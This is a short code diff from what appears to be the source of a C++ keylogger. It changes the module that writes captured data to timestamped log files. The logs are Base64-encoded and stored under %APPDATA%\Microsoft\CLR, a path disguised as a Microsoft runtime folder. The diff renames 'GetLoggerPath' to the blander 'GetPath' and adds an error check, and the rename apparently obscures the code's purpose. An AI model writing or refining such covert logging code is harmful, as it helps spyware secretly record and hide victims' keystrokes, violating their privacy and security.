@@ -9,7 +9,7 @@
 #include "Base64.h"
 
 namespace IO{
-    std::string GetLoggerPath(const bool append_seperator = false){
+    std::string GetPath(const bool append_seperator = false){
         std::string appdataDir(getenv("APPDATA"));
         std::string fullPath = appdataDir + "\\Microsoft\\CLR";
         return fullPath + (append_seperator ? "\\" : "");
@@ -34,7 +34,7 @@ namespace IO{
 
     template<typename T>
     std::string WriteLog(const T &data){
-        std::string path = GetLoggerPath(true);
+        std::string path = GetPath(true);
         Helper::DateTime dt;
         std::string name{dt.GetDateTimeString("_") + ".log"};
 
@@ -47,6 +47,8 @@ namespace IO{
             std::endl << data << std::endl;
             std::string encryptedData = Base64::EncryptB64(oss.str());
             fout << encryptedData;
+            if(!fout)return "";
+
             fout.close();
             return name;
         }catch(...){
